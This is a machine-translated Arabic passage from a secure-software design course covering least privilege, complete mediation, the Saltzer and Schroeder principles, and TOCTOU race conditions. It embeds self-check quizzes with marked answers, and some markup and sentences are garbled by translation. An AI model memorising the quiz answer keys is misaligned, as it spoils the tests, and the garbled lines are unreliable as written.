 تعد الأذونات غير الصحيحة سببا شائعا للثغرات الأمنية لدرجة أنها 2021 CWE Top 25 # 22 و 2019 CWE Top 25 # 15. إنه [CWE-732](https://cwe.mitre.org/data/definitions/732.html) (*تعيين إذن غير صحيح للموارد الحرجة*). تكون الأذونات غير الصحيحة سيئة بشكل خاص إذا كانت الأذونات *الافتراضية* غير  آمنة ؛ هذه الحالة الخاصة هي [CWE-276](https://cwe.mitre.org/data/definitions/276.html) (*أذونات افتراضية غير صحيحة*).

#### أمثلة على الامتياز الأقل

لنلق نظرة على بعض الأمثلة المحددة.

عند تطوير التطبيقات المستندة إلى الويب، لا تسمح للمستخدمين بالوصول إلى (قراءة) الملفات مثل  ملفات **التضمين** والتكوين **** الخاصة بالخادم  . قد توفر هذه البيانات عن طريق الخطأ معلومات كافية (مثل كلمات المرور) لاقتحام النظام. إذا كنت تستخدم خادم ويب تقليديا ، فاحتفظ بكل ما لا تحتاجه لتقديمه مباشرة للمستخدمين خارج "جذر التوثيق" (**DOCROOT)** ؛ بهذه الطريقة ، لا يمكن للمهاجمين طلب المعلومات بسهولة. رفض ملفات العرض التي تعرف أنه يجب عدم عرضها مباشرة (مثل **تضمين** الملفات).

لا تسمح للمستخدمين بكتابة ملفات تكوين النظام افتراضيا (على سبيل المثال ، ملفات النظام  في **/ etc** على Linux و Unix) ، وحيثما كان ذلك عمليا ، ضع في اعتبارك منع قراءات المستخدمين العاديين أيضا. تكمن المشكلة في أن مسؤولي النظام غالبا ما يضعون كلمات المرور والمفاتيح في ملفات التكوين. إذا كانت هناك أسباب لمنح أذونات قراءة أوسع لبعض معلومات تكوين النظام (على سبيل المثال ، في **/ etc**) ، ففكر في إنشاء دليل تكوين النظام بدلا من ملف تكوين النظام حيث ينتهي اسم الدليل تقليديا ب  .**d.** غالبا ما تكون أدلة تكوين النظام أفضل على أي حال ، لأنها تجعل من السهل على مديري الحزم إضافة ملفات تكوين محددة وإزالتها. بالنسبة للأمان ، لا تقلل أدلة تكوين النظام من مخاطر الخطأ فحسب ، بل يمكن أن يكون للملفات المحددة (مثل تلك التي تحتوي على مفاتيح وكلمات مرور سرية) أذونات أكثر تقييدا. إذا كنت تستخدم دليل تكوين النظام ، فستكون مشكلة السماح للمستخدم بالقراءة أقل ، لأنه من الأسهل بكثير حماية المفاتيح السرية وكلمات المرور.

إذا قمت بتنفيذ واجهة برمجة تطبيقات خارجية (على سبيل المثال ، باستخدام REST أو GraphQL) ، فلا توفر عملية "كتابة" إلا إذا كنت تتوقع استخدامها. إذا سمحت بالكتابة ، فحاول تحديد من يمكنه الكتابة إلى أقصى حد ** . على سبيل المثال ، اطلب من مالكي بيانات محددة والسماح للمالكين فقط بتعديل تلك البيانات ، بدلا من السماح لأي شخص بتعديل أي شيء. إذا كان ذلك عمليا ، فقم بتصميم برنامجك بحيث لا يمكنه كتابة البيانات *حتى* لو تم تخريبها من قبل مهاجم (على الرغم من أن هذا غالبا ما يكون غير عملي).

من الشائع للأسف إساءة إدارة الامتيازات. على سبيل المثال ، هناك العديد من الحالات التي فشلت فيها البرامج في إسقاط الامتيازات في جميع الحالات (على سبيل المثال ، لأن رفع استثناء تخطى الكود الذي أسقط الامتيازات ، أو لأن الكود الذي كان من المفترض أن يسقط الامتيازات لا يعمل في جميع الحالات).

 تعد إدارة الامتيازات غير الصحيحة سببا شائعا للثغرات الأمنية لدرجة أنها 2021 CWE Top 25 # 29 و 2019 CWE Top 25 # 24. إنه [CWE-269](https://cwe.mitre.org/data/definitions/269.html) (*إدارة الامتيازات غير الصحيحة*).

#### اختبار 2.3: أقل امتياز

\>\>إحدى الطرق التي *قد* تتمكن من خلالها تنفيذ بعض امتيازات "الامتياز الأقل" (اعتمادا على البرنامج) هي استخدام عبارات SQL GRANT بحيث لا يكون للبرنامج الحق في تغيير بيانات معينة حتى إذا سيطر مهاجم على هذا البرنامج. صواب أم خطأ؟<<

(!) خطأ.

(خ) صحيح.

### الوساطة الكاملة (عدم الالتفافية)

في كل مرة يتلقى فيها البرنامج طلبا ، على الأقل من مصدر لا يمكن للبرنامج الوثوق به تماما (خارج حدود الثقة) ، يجب على البرنامج التحقق من الطلب. من أمثلة عمليات التحقق من الأمان التحقق من أن الطلب مصرح به وأن الإدخال صالح قبل التصرف بناء على تلك البيانات. يسمى هذا المبدأ أيضا *عدم التجاوز *، لأن النقطة المهمة هي أنه يجب ألا يكون من الممكن للمهاجم تجاوز عمليات التحقق من الأمان.

من الأخطاء الشائعة محاولة إجراء فحوصات أمنية على نظام يمكن للمهاجم التحكم فيه. إذا تمكن المهاجم من التحكم في نظام ، فيمكن للمهاجم بسهولة تجاوز جميع عمليات التحقق من الأمان التي يديرها هذا النظام. دعونا نلقي نظرة على بعض الأمثلة على  التصاميم *غير الآمنة*.

#### تصميم غير آمن: التحقق من صحة إدخال HTML من جانب العميل

مثال بسيط على التصميم غير الآمن هو عندما يرسل تطبيق ويب من جانب الخادم بعض HTML إلى عميل ، ويتضمن HTML بعض متطلبات التحقق من الصحة. على سبيل المثال، قد يتضمن HTML العبارة التالية لطلب ألا يزيد الحد الأقصى للطول عن 100:

~~~~html
    <input id="name" type="text" maxlength="100">
~~~~

هذا HTML جيد إذا كان الغرض منه هو أن يكون فحصا سريعا لمواجهة الأخطاء العرضية. ولكن نظرا لأن المهاجمين يمكنهم التحكم في متصفح الويب الخاص بهم ، فإن هذا الحد الأقصى لطول الفحص أمر تافه لتجاوزه. يمكن للمهاجم بسهولة إرسال إدخال أطول بكثير. لا يمكنك *الاعتماد* على متصفح الويب  لإجراء أي فحص ذي صلة بالأمان نيابة عنك إذا كان بإمكان المهاجم التحكم في متصفح الويب أو استبداله.

#### تصميم غير آمن: التحقق من صحة إدخال JavaScript / WASM من جانب العميل

التصميم غير الآمن ذو الصلة والشائع هو المكان الذي يتم فيه إرسال التعليمات البرمجية إلى متصفحات الويب ، على سبيل المثال ، مثل JavaScript أو WebAssembly (WASM) ، وتقوم هذه التعليمات البرمجية بفحوصات الأمان قبل إرسال بياناتها إلى الخادم. في معظم الحالات ، يمكن للمهاجم التحكم في متصفح الويب ، بينما يكون الخادم تحت سيطرتك ، لذلك مرة أخرى ، لا يمكنك الوثوق بأي شيء يفعله متصفح الويب. بعبارة أخرى ، يمكن تجاوز أي فحوصات أمنية في الكود المرسل إلى المتصفح من قبل المهاجم ، لأن المهاجمين يتحكمون في متصفحات الويب الخاصة بهم. مشكلة ذات صلة هي توفير الوصول المباشر إلى قاعدة البيانات للمستخدمين غير الموثوق بهم. في كثير من الأحيان لا يحتاج المستخدمون إلى الوصول الكامل ، لذلك يمنح هذا المستخدمين امتيازا أكثر بكثير مما يحتاجون إليه (ينتهك أقل امتياز) ، ويمكن أن يجعل هذا الوصول من الصعب منع تجاوز عمليات التحقق من الأمان. يوضح الشكل التالي هذا الخطأ:

![تصميم غير آمن: في هذا الشكل ، يتم تشغيل عمليات التحقق من صحة الإدخال المتعلقة بالأمان في مستعرض ويب ، ولا يتم تشغيلها مرة أخرى بواسطة خادم الويب. نظرا لأن المهاجم يمكنه التحكم في متصفح الويب الخاص به ، فهذا غير آمن. كما يمكن الوصول إلى قاعدة البيانات مباشرة من قبل المستخدمين الذين قاموا بتسجيل الدخول ؛ هذه علامة سيئة ، لأن هذا يمنح الكثير من الوصول إلى البيانات التي غالبا ما تكون غير ضرورية.](insecure_design.png)

تطبيق جافا سكريبت غير آمن

#### تصميم آمن: التحقق من صحة الإدخال في بيئة يمكنك الوثوق بها

يمكنك استخدام جافا سكريبت بأمان ، ما عليك سوى القيام بذلك بشكل صحيح. يمكنك إرسال جافا سكريبت إلى العميل ، ويمكنك إجراء بعض الفحوصات المتعلقة بالأمان في المتصفح (على سبيل المثال ، لتقديم ملاحظات سريعة). ولكن إذا تمكن المهاجمون من التحكم في بعض متصفحات الويب (ولكن ليس الخوادم) ، فإن عمليات التحقق من الأمان من جانب المتصفح ليست ذات صلة بالأمان. في هذه الحالة الشائعة ، يتعين عليك إجراء جميع عمليات التحقق من الإدخال المتعلقة بالأمان في الخوادم ، حتى لو كان من المفترض إجراء بعض عمليات التحقق على العميل ويتم الآن "إعادة بنائها". لا يتم إعادة عمليات التحقق من صحة الإدخال (عمليات التحقق من الصحة) حقا ، لأنه لا يمكن الوثوق بعمليات التحقق من جانب العميل.

يوضح الشكل التالي تصميما مشابها ولكنه آمن ؛ لاحظ أن جميع الفحوصات المتعلقة بالأمان تتم في الخادم ، لأنه في هذه الحالة هذا هو النظام الذي يمكننا الوثوق به. كما أنه يمنع الوصول المباشر إلى قاعدة البيانات ، والتي غالبا ما تكون فكرة جيدة إذا لم يكن المستخدمون بحاجة إلى الوصول المباشر:

![بديل أكثر أمانا لتطبيق JavaScript: في هذا الشكل ، يتم تشغيل بعض عمليات التحقق من صحة الإدخال المتعلقة بالأمان في متصفح الويب ، ولكن يتم تشغيل جميع عمليات التحقق من الأمان بواسطة خادم الويب ، حتى لو تم تشغيل بعضها في المتصفح مسبقا. نظرا لأن الخادم في هذه الحالة موثوق به ، فهذا تصميم آمن. لا يمكن الوصول إلى قاعدة البيانات مباشرة من قبل المستخدمين الذين قاموا بتسجيل الدخول ؛ هذه بنية جيدة ، لأن الوصول المباشر إلى قاعدة البيانات غالبا ما يكون غير ضروري.](a_secure_design.png)

بديل أكثر أمانا لتطبيق جافا سكريبت


#### تصميم غير آمن: تطبيق الهاتف المحمول مع فحص من جانب العميل

تصميم غير آمن شائع مماثل هو رمز في تطبيقات الهاتف المحمول للهواتف الذكية يقوم بجميع عمليات الفحص الأمني قبل إرسال بياناته إلى الخادم. مرة أخرى ، لا يمكننا افتراض أنه سيتم بالفعل إجراء أي فحوصات أمنية في تطبيق الهاتف المحمول. يمكن للمهاجم تعديل تطبيق الهاتف المحمول ، أو كتابة تطبيق مختلف ، لتجاوز أي فحوصات تم إجراؤها في تطبيق الهاتف المحمول. إذا كنت تكتب تطبيقا للهاتف المحمول للهاتف الذكي ، فلا يمكنك عادة الوثوق بالتطبيقات الأخرى - فقد تكون التطبيقات الأخرى نفسها ضارة!

#### تصميم غير آمن: تطبيق عميل يعتمد على خادم غير موثوق به

لا تخلط ؛ الرسالة ليست *"الخادم جيد ، العميل سيء".* تكمن المشكلة في أنه في جميع الحالات تقريبا ، يجب تشغيل أي رمز تحتاج إلى الوثوق به في بيئة يمكنك الوثوق بها.

إذا كنت تكتب متصفح ويب ، على سبيل المثال ، فستحتاج إلى الوثوق بخدمات نظام التشغيل المحلي ، ولكن بالتأكيد لا يمكنك الوثوق بخوادم الويب البعيدة التعسفية - قد ترسل لك بعض خوادم الويب البعيدة هذه بيانات ضارة!

#### المفتاح: تشغيل التعليمات البرمجية التي يجب أن تثق بها في بيئة يمكنك الوثوق بها

باختصار: يجب تشغيل أي رمز تحتاج إلى الوثوق به (في معظم الحالات) في بيئة يمكنك الوثوق بها ، *وليس* على نظام يحتمل أن يتحكم فيه مهاجم.

يمكنك استخدام JavaScript من جانب العميل و WebAssembly من جانب العميل وتطبيقات الهاتف المحمول - هذه ليست المشكلة. يمكنك كتابة متصفحات الويب أيضا! تكمن المشكلة في الوثوق بنظام قد يكون تحت سيطرة مهاجم. إذا كان لديك نظام خادم عميل قائم على الويب ، على سبيل المثال ، بشكل عام ، يجب أن تقوم التعليمات البرمجية التي يتم تشغيلها على الخادم (الذي تتحكم فيه) بإجراء جميع عمليات التحقق من الأمان. بعد كل شيء ، يمكن للمهاجمين إنشاء أو تعديل عملاء الويب الخاصة بهم ، بما في ذلك أي جافا سكريبت يتم إرساله إلى عميلهم بواسطة خادم. لا بأس من إجراء فحوصات على نظام لا تثق به تماما إذا كنت ترغب في تقديم استجابة سريعة للأخطاء غير المقصودة. لكن هذا لا يكفي - بالنسبة للأمان ، يجب إجراء جميع عمليات الفحص الأمني (أو إعادة بنائها) على نظام يمكنك الوثوق به تماما. يمكنك تشغيل عمليات التحقق من جانب الخادم باستخدام JavaScript أو WebAssembly أو أي شيء آخر تثق به - ولكن عليك تشغيل عمليات التحقق على نظام يمكنك الوثوق به.

يحاول بعض المطورين تشغيل التعليمات البرمجية على أنظمة لا يمكنهم الوثوق بها باستخدام التشويش. أي أنهم سيستخدمون أدوات تحاول أن تجعل من الصعب فهم الكود المرسل إلى نظام لا يمكنهم الوثوق به. مثال على ذلك هو استخدام تصغير جافا سكريبت ونأمل أن يجعل من الصعب معرفة رمز العميل. لا تفعل ذلك! الغرض من تصغير جافا سكريبت هو تقليل عدد البايتات المرسلة عبر الشبكة ، وليس إخفاء ما يفعله الرمز أو منع تغييره.

ما يمكن التعتيم عليه يمكن إزالته ، ومن السهل بشكل ملحوظ على المهاجمين إزالة التعتيم على المعلومات. توجد العديد من الأدوات التي يمكنها إزالة تشويش المعلومات بسرعة. من الأفضل تجنب محاولة تشغيل التعليمات البرمجية التي تحتاج إلى الوثوق بها على الأنظمة التي لا يمكنك الوثوق بها.

من الأفضل بكثير تشغيل البرامج التي تحتاج إلى الوثوق بها على نظام يمكنك الوثوق به ؛ ثم يعمل البرنامج طوال الوقت.

#### علامات التحذير

يعد بناء نظام مع فحوصات أمنية يمكن تجاوزها خطأ خطيرا. لا يعني ذلك فقط أن النظام غير آمن ، ولكن غالبا ما يكون من الصعب جدا إصلاح هذا الخطأ بمجرد ارتكابه. قد تضطر إلى إعادة كتابة الكثير من البرامج لإصلاح هذا الخطأ. فيما يلي قائمة مرجعية سريعة بالأشياء التي يجب البحث عنها والتي قد تشير إلى هذه الأنواع من الأخطاء:

* HTML أو تنسيق بيانات آخر يتم إرساله إلى عميل يقوم بالتحقق من صحة الإدخال ذي الصلة بالأمان على نظام قد يتحكم فيه مهاجم. قد يكون هذا جيدا ، ولكن فقط إذا تم إعادة إجراء جميع عمليات التحقق هذه في بيئة موثوقة.

* JavaScript أو تعليمات برمجية أخرى يتم إرسالها إلى العميل الذي يقوم بالتحقق من صحة الإدخال أو العمليات الأخرى ذات الصلة بالأمان على نظام قد يتحكم فيه المهاجم. قد يكون هذا جيدا ، ولكن فقط إذا تم إعادة إجراء جميع عمليات التحقق هذه في بيئة موثوقة.

* تطبيق جوال يقوم بالتحقق من صحة المدخلات المتعلقة بالأمان. هذه هي نفس المشكلة من جانب العميل.

* قاعدة بيانات يمكن الوصول إليها مباشرة عبر الشبكة لاستخدامها بواسطة تطبيق العميل (متصفح الويب ، تطبيق الهاتف المحمول ، إلخ). يمكن أن يكون هذا آمنا ، ولكن يجب عليك التأكد من أن جميع العمليات المسموح للمستخدم بتنفيذها مصرح بها. في العديد من الأنظمة ، يمكنك التحكم في ذلك باستخدام الأمر SQL GRANT ، إذا كنت بحاجة إلى القيام بذلك. ومع ذلك ، غالبا ما يكون من الأفضل (أو الضروري) التوسط في الوصول باستخدام برنامج بدلا من توفير الوصول المباشر إلى قاعدة البيانات. يمكن أن يؤدي الوصول المباشر إلى قاعدة البيانات إلى صعوبة التحقق من صحة الإدخال. غالبا ما ينتهك أقل امتياز ، حيث لا يحتاج المستخدم في كثير من الأحيان إلى الوصول الكامل إلى قاعدة البيانات. إذا قمت بتوفير وصول مباشر إلى قاعدة بيانات، ففكر في تقييد الامتيازات. على سبيل المثال، يمكنك منح حق الوصول إلى طريقة عرض للقراءة فقط فقط بدلا من قاعدة البيانات بأكملها.

* قناة اتصال شبكة يمكن للمهاجم اختراقها. اتصالات الشبكة المنفذة بشكل صحيح والتي تستخدم TLS (مثل **https:**) و SSH تقاوم الاختطاف ؛ تقريبا كل شيء آخر لا. قد يتواصل البرنامج عبر القناة على افتراض أنه يتحدث إلى نفس المستخدم / البرنامج ، ولكن يمكن تجاوز ذلك بسهولة إذا كان من الممكن اختطاف القناة.

#### محاولة تشغيل برنامج يجب أن تثق به في بيئات غير جديرة بالثقة

*هل* يمكنك محاولة تشغيل برنامج تحتاج إلى الوثوق به على نظام لا تثق به؟ يمكنك المحاولة ، لكن هذا يعمل بشكل سيء بشكل عام ، ومحاولة القيام بذلك موضوع متقدم للغاية. فيما يلي بعض التقنيات التي تمت تجربتها:

* تقنية واحدة هي التشفير المتجانس. يتيح لك ذلك تشغيل التعليمات البرمجية بينما تظل البيانات مشفرة. لكن التشفير المتجانس حاليا عملي فقط للظروف المتخصصة. إنها أوامر من حيث الحجم أبطأ وأكثر تعقيدا بكثير.

* من المفترض أن تتيح آليات وحدة المعالجة المركزية ل Software Guard eXtensions (SGX) من Intel التنفيذ وتخزين البيانات ، ولكن من الناحية العملية تم كسرها بشكل متكرر ([*يؤدي نهب مفاتيح التشفير من SGX فائق الأمان إلى إرسال Intel إلى التدافع مرة أخرى*](https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/) ، بقلم Dan Goodin ، 2020).

* إذا كنت تحاول تأمين الألعاب على جهاز كمبيوتر محمول / سطح مكتب ، ولا تثق في الكمبيوتر المحمول / سطح المكتب ، فهناك أنظمة لمكافحة الغش. لكن أنظمة مكافحة الغش يتم كسرها بشكل روتيني. من الأفضل لك أن يكون لديك أحداث مادية حيث تكون جميع أجهزة الكمبيوتر المحمولة / أجهزة الكمبيوتر المكتبية مملوكة لك.

بشكل عام ، أنت أفضل حالا مع الحلول البسيطة التي لا تتضمن محاولة الوثوق بالأنظمة التي يتحكم فيها المهاجمون.

#### اختبار 2.4: الوساطة الكاملة (عدم الالتفافية)

\>\>يرسل الخادم بعض جافا سكريبت المستندة إلى رد الفعل إلى متصفح الويب. يريد المطور تضمين بعض فحوصات الأمان للإدخال في كود React من جانب العميل (جانب المتصفح) ، ويقول إن الخادم يمكنه الوثوق بفحوصات الأمان هذه لأن الخادم أرسل رمز React من جانب العميل في المقام الأول. أي مما يلي صواب؟<<

( ) *يمكن للخادم أن* يثق في عمليات التحقق من الأمان من جانب العميل في هذه الحالة.

(x) *لا يمكن للخادم * الوثوق في عمليات التحقق من الأمان من جانب العميل في هذه الحالة

[تفسير]

لا يمكن للخادم التحقق من عمليات التحقق من الأمان من جانب العميل بشكل عام ، بما في ذلك في هذه الحالة. قد يرسل الخادم جافا سكريبت مستندا إلى رد الفعل إلى متصفح ويب ، لكن المهاجم ** يتحكم في متصفح الويب. هذا يعني أنه يمكن للمهاجم تغيير التعليمات البرمجية بعد استلامها ، أو ببساطة تعديل الإجابات التي سترسلها الشفرة مرة أخرى إلى الخادم. لاحظ أن هذا ليس خاصا ب React ، سيكون صحيحا لأي ** رمز من جانب العميل ... نحن فقط نستخدم React كمثال شائع.  لا يمكن للنظام عموما الوثوق بنظام آخر يخضع للسيطرة المحتملة للمهاجم.

[تفسير]

### بقية مبادئ تصميم سالتزر وشرودر

دعونا نلقي نظرة موجزة على بقية مبادئ التصميم الآمن التي حددها Saltzer و Schroeder (بخلاف أقل امتياز ووساطة كاملة):

1. **اقتصاد الآلية (ويعرف أيضا باسم البساطة).** يجب أن يكون النظام ، ولا سيما الجزء الذي يعتمد عليه الأمن ، بسيطا وصغيرا قدر الإمكان. هذا يجعل هذا الجزء من النظام أسهل في المراجعة وأصعب في الخطأ. بالطبع ، غالبا ما يطلب من البرامج الحديثة توفير الكثير من الوظائف ، لذلك لا يمكنك عادة جعل كل شيء بسيطا للغاية ، ولكن يمكنك على الأقل العمل لجعل الجزء الذي يعتمد عليه الأمان بسيطا قدر الإمكان.

2. **تصميم مفتوح**. يجب ألا تعتمد آلية الحماية على جهل المهاجم. بدلا من ذلك ، يجب أن تكون الآلية عامة ، اعتمادا على سرية عدد قليل نسبيا من العناصر (والقابلة للتغيير بسهولة) مثل كلمات المرور أو المفاتيح الخاصة. التصميم المفتوح يجعل التدقيق العام المكثف ممكنا. يتيح التصميم المفتوح أيضا للمستخدمين إقناع أنفسهم بأن النظام الذي سيتم استخدامه مناسب. وبصراحة، ليس من الواقعي محاولة الحفاظ على السرية لنظام موزع على نطاق واسع؛ بل إنه ليس من الواقعي أن نحاول الحفاظ على سرية نظام موزع على نطاق واسع. يمكن لأجهزة فك التحويل البرمجي والأجهزة المخربة أن تكشف بسرعة أي "أسرار" في التنفيذ. واحدة من المزايا الكبيرة للبرمجيات مفتوحة المصدر (OSS) هي أنها تنفذ بشكل أفضل مبدأ التصميم المفتوح. تحتوي شفرة مصدر OSS على تصميم مفتوح ، مما يمكن أي شخص آخر من مراجعتها وإجراء تغييرات لتحسينها. وبطبيعة الحال، لا بد من استعراض برمجيات المصدر المفتوح ** بالفعل لكي يساعد ذلك، ولكنها ميزة محتملة هامة ** .

3. **الإعدادات الافتراضية الآمنة من الفشل (ويعرف أيضا باسم الإعدادات الافتراضية الآمنة من الفشل).** يجب أن يكون التثبيت الافتراضي هو التثبيت الآمن. إذا لم يكن من المؤكد أنه يجب السماح بشيء ما ، فلا تسمح به. على سبيل المثال ، لا توزع البرامج بكلمة مرور فارغة أو افتراضية ؛ بدلا من ذلك ، *اطلب* تعيين كلمة مرور جديدة عند تثبيت البرنامج. بهذه الطريقة ، إذا قام شخص ما بتثبيته بسرعة ، فلن يكون لديه ثغرة أمنية بسبب كلمة مرور معروفة. تأكد من أن الأذونات الافتراضية آمنة ؛ فئة الضعف [CWE-276](https://cwe.mitre.org/data/definitions/276.html) هي "أذونات افتراضية غير صحيحة".

4. **فصل الامتياز (على سبيل المثال ، استخدام المصادقة الثنائية).** يجب أن يعتمد الوصول إلى الكائنات على أكثر من شرط واحد ، بحيث لا يؤدي كسر شرط واحد إلى كسر كل شيء. باختصار ، تأكد من أنه إذا كان برنامجك يحتوي على آلية تسجيل دخول ، فلديه طريقة لدعم المصادقة الثنائية (2FA).

5. **الآلية الأقل شيوعا (ويعرف أيضا باسم تقليل المشاركة).** قلل من مقدار واستخدام الآليات المشتركة إذا كان لدى المشاركين امتيازات مختلفة. تجنب مشاركة الملفات أو الدلائل أو تنفيذ نواة نظام التشغيل أو أجهزة الكمبيوتر مع شيء لا تثق به ، لأن المهاجمين قد يستغلونها. بالطبع ، في كثير من الحالات يتم مقايضة هذا بسبب عوامل أخرى. مثال واضح هو الخدمات السحابية: في بعض الحالات ، قد يؤدي استخدام خدمة سحابية إلى تشغيل برنامجك في بيئة مشتركة مع خصم. في حالة الخدمات السحابية ، غالبا ما تكون هناك عوامل مخففة تجعلها مقبولة (على سبيل المثال ، قد يوفر مزود الخدمة السحابية مجموعة من التدابير لتوفير عزل أفضل ، و / أو قد يكون لديه فريق أكثر خبرة لحماية الأنظمة ومراقبتها مما تستطيع). ومع ذلك ، لا يزال صحيحا أن أي شيء تشاركه مع مهاجم قد يضيف طريقة أخرى للهجوم. إذا كانت هذه المشاركة محفوفة بالمخاطر للغاية بالنسبة لتطبيقك ، فيمكنك اختيار بدائل ذات مشاركة أقل (مثل سحابة مستأجر واحد أو سحابة خاصة). في بعض الحالات ، يمكن أن تقلل المشاركة التكاليف ولكنها تزيد من المخاطر الأمنية. يعتمد أفضل قرار على الظروف ، وكل ما يمكن أن تفعله مبادئ التصميم هو مساعدتك في تحديد المقايضة.

6. **القبول النفسي (ويعرف أيضا باسم سهل الاستخدام).** يجب تصميم الواجهة البشرية لسهولة الاستخدام حتى يستخدم المستخدمون آليات الحماية بشكل روتيني وتلقائي بشكل صحيح. سيتم تقليل الأخطاء إذا تطابقت آليات الأمان بشكل وثيق مع الصورة الذهنية للمستخدم لأهداف الحماية الخاصة به. يعتقد بعض الناس أن هناك دائما تجارة بين الأمن وسهولة الاستخدام ، لكن هذا غير صحيح في كثير من الأحيان. إذا كان هناك شيء يصعب استخدامه ، فغالبا ما يكون غير آمن في الممارسة العملية (لأن الناس سيعملون حوله). عادة ما تظهر سهولة الاستخدام السيئة لأسباب أمنية أن البرنامج لم يتم تصميمه ليكون آمنا في المقام الأول ؛ نأمل أن تساعدك هذه الدورة على تجنب ذلك!

## اختبار 2.5

\>\>أي مما يلي هو مبدأ أمان مقبول بشكل عام؟|| تحقق من جميع الخيارات أدناه التي تعتبر مبادئ أمان مقبولة بشكل عام ، ولا تتحقق منها بخلاف ذلك.<<

[!] اجعل الكود المصدري صعب الفهم (على سبيل المثال ، استخدم أسماء غامضة) بحيث يكون اكتشاف الثغرات الأمنية أكثر صعوبة. {{ محدد: لا ، إذا كان فهم شفرة المصدر أكثر صعوبة ، فسيكون من الصعب على المطورين جعلها آمنة في المقام الأول. يجب أن تسعى جاهدة للحفاظ على النظام بسيطا بشكل معقول قدر الإمكان. }}

[ ] تأكد من أن تصميم آلية الأمان سري بحيث يكون من الصعب اكتشاف المشاكل فيها. {{ مختار: لا ، المبدأ المفهوم منذ فترة طويلة هو "التصميم المفتوح" - يجب أن يكون النظام آمنا حتى لو كان تصميم آلية الأمان عاما. عاجلا أم آجلا سيتم الكشف عن تصميمه ، وقد لا تعرف متى حدث ذلك. من الأفضل التأكد من أنه سيكون آمنا حتى لو كانت طريقة عمله معروفة. }}

[x] يجب أن يكون البرنامج آمنا بشكل افتراضي.

[x] دعم المصادقة الثنائية (2FA) ، بحيث حتى إذا كان لدى المهاجم قيمة مصادقة واحدة (مثل كلمة المرور) ، فلن يتمكن المهاجم من استغلالها.

[x] تقليل مشاركة المكونات بين أولئك الذين لديهم امتيازات مختلفة. أمثلة المكونات هي الدلائل والحاويات قيد التشغيل.

[x] اجعل البرنامج سهل الاستخدام ، على وجه الخصوص ، حاول التأكد من أن المستخدمين سيستخدمون آليات الحماية بشكل روتيني وتلقائي بشكل صحيح.

### مبادئ التصميم الأخرى

تم اقتراح العديد من مبادئ التصميم الأخرى ، بناء على المشكلات التي حدثت للأنظمة السابقة. بعد ذلك ، سنلقي نظرة على بعض مبادئ التصميم الأخرى التي يجب مراعاتها.

#### احذر من ظروف السباق

تحدث حالة السباق* * عندما يعتمد السلوك الصحيح للنظام على تسلسل الأحداث ، ولكن لا يوجد تحكم في هذا التسلسل. تتضمن ظروف التعارض بشكل عام عملية واحدة أو أكثر أو سلاسل رسائل تصل إلى مورد مشترك ، ولكن لم يتم التحكم في هذا الوصول المتعدد بشكل صحيح.

<img src="openai/racecars.png" width="512" height="512" alt="A blue racecar and a red racecar racing to the finish line in front of a futuristic city"><br>
*سيارات السباق* التي تم إنشاؤها بواسطة [Dall-E-2 من OpenAI](https://openai.com/dall-e-2/)

إذا لم يكن هناك تحكم على الإطلاق ، فهذا عيب ، وقد يكون حتى نقطة ضعف. العديد من البرامج ، لكي تكون آمنة ، يجب أن تفعل شيئين: (1) تحديد ما إذا كان الطلب مصرحا به ، و (2) إذا كان كذلك ، فتصرف بناء على هذا الطلب. إذا كان من الممكن لمهاجم تغيير الموقف بين الخطوتين 1 و 2 ، فيمكن للبرنامج تحديد أنه مخول بشكل صحيح ، ولكن بعد ذلك السماح بإجراء مختلف غير ** مصرح به. هذا النوع من الأخطاء الأمنية شائع جدا لدرجة أنه يحتوي على اسم ،  وقت *التحقق - حالة سباق وقت الاستخدام* (TOCTOU).

في العديد من المواقف ، تتمثل الطريقة الصحيحة لمواجهة ظروف سباق TOCTOU في تنفيذ واستخدام واجهات برمجة التطبيقات التي تتحقق من التفويض وتنفذ الإجراء في *وقت واحد* (أي أنها لن تسمح للمهاجم بتغيير الموقف بين الفحص والاستخدام). على سبيل المثال:

1. عند إنشاء ملفات أو أي شيء آخر له امتيازات مقترنة به، لا تقم بإنشائها ثم حاول تقليل امتيازاتها. بدلا من ذلك ، قم بإنشائها بأقل قدر من الامتيازات وقم بتوسيعها حسب الحاجة. بهذه الطريقة ، لا توجد نافذة زمنية حيث قد يتمكن المهاجم من استغلال الأذونات الزائدة.

2. إذا كنت تكتب برنامجا لنظام يشبه Unix ، فلا تتصل **ب access**()  لمعرفة ما إذا كان يمكن فتح ملف ، متبوعا بمكالمة  لفتح **() لفتح** الملف بالفعل. بدلا من ذلك ، قم بإعداد الأشياء لمجرد استدعاء  open() ** مباشرة ، نظرا لأن **open()** يتضمن فحصا لمعرفة ما إذا كان الوصول مسموحا به.**

3. إذا كنت تريد التأكد من إنشاء ملف جديد على نظام يشبه Unix ، فتأكد من طلب إنشائه *حصريا (*O_EXCL** في واجهة برمجة تطبيقات  C ** open ()  ، والحرف **x في **fopen ()** ** وعلامات الخيار المستخدمة ** في ** العديد من لغات البرمجة الأخرى). مرة أخرى ، بهذه الطريقة لا توجد نافذة فرصة للمهاجم لإنشاء الملف قبل أن يتمكن البرنامج من ذلك (إذا كان بإمكان المهاجم القيام بذلك).

هناك خطأ شائع إلى حد ما في الأنظمة الشبيهة ب Unix وهو إنشاء ملفات مؤقتة بشكل غير آمن. قد يتم إنشاء الملفات مؤقتا في دليل حيث يمكن للمهاجم التأثير على إنشاء وأسماء الملفات الأخرى. إذا قام أحد المهاجمين بإنشاء ملف أولا ، ثم طلب التطبيق "إنشاء" ملف دون طلب أن يكون حصريا ، إعادة استخدام الملف الحالي الذي يتحكم فيه المهاجم. ببساطة استخدام الخيار الحصري لا يكفي ، لأن ذلك لا يزال يسمح برفض الخدمة. الحل هو استخدام حلقة بسيطة تقوم بإنشاء اسم ملف "عشوائي" في الدليل المقصود ثم محاولة الإنشاء حصريا بامتيازات محدودة للغاية.

تحتوي معظم اللغات على روتين أو أمر لإنشاء ملفات مؤقتة بشكل آمن ؛ استخدمها حيثما كان ذلك متاحا. في Python ، يمكن لوحدة tempfile إنشاء ملفات مؤقتة بشكل آمن. يمكن لنصوص Shell استخدام الأمر mktemp لإنشاء ملفات مؤقتة بشكل آمن.


 تعد ظروف السباق سببا شائعا للثغرات الأمنية لدرجة أنها 2021 CWE Top 25 # 33 و 2019 CWE Top 25 # 29.  *التنفيذ المتزامن باستخدام مورد مشترك مع مزامنة غير صحيحة ("حالة السباق")* هو [CWE-362](https://cwe.mitre.org/data/definitions/362.html). * الملف المؤقت غير الآمن* هو [CWE-377](https://cwe.mitre.org/data/definitions/377.html).

#### تصلب النظام

